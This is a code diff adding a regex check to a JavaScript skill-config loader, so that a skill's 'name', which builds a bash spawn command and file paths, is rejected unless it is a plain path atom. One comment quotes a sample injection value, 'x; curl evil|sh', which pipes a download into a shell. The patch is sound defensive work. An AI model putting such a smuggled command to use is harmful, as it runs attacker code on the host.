@@ -306,6 +306,15 @@ function skillIdentityOf(raw, source) {
     if (!isNonEmptyString(raw.name)) {
         throw skillError(source + ': "name" is required (non-empty string)');
     }
+    // The name composes shell commands and file paths (the specialist spawn
+    // `bash agents/scripts/run-agent.sh input/<ticket>/pool_specialist-<name>.md`
+    // and the candidates file name) — a path atom only. A hostile name
+    // ('x; curl evil|sh') is a config error, rejected at the resolution
+    // boundary (found by the pool simulation's security-lens session).
+    if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(raw.name)) {
+        throw skillError(source + ': "name" must match /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/ ' +
+            '(it composes the spawn command and file paths) — got ' + JSON.stringify(raw.name));
+    }
     if (!isNonEmptyString(raw.lens)) {
         throw skillError(source + ': "lens" is required (the instruction markdown path)');
     }
